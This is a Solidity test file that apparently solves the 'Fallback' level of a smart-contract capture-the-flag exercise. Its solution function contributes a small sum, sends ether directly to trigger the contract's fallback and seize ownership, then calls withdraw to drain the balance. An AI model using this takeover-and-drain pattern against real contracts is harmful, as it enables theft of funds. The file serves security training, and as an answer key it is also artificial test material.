// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {FallbackFactory} from "../src/levels/01-FallbackFactory.sol";
import {Fallback} from "../src/levels/01-Fallback.sol";

contract FallbackSolution is BaseTest {

    function solution(address payable target_) internal override{
        Fallback target = Fallback(target_);
        target.contribute{value: 100 wei}();
        (bool result,)= payable(target).call{value: 100 wei, gas: 30000}(bytes(""));
        result;
        target.withdraw();
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new FallbackFactory()));
    }
}
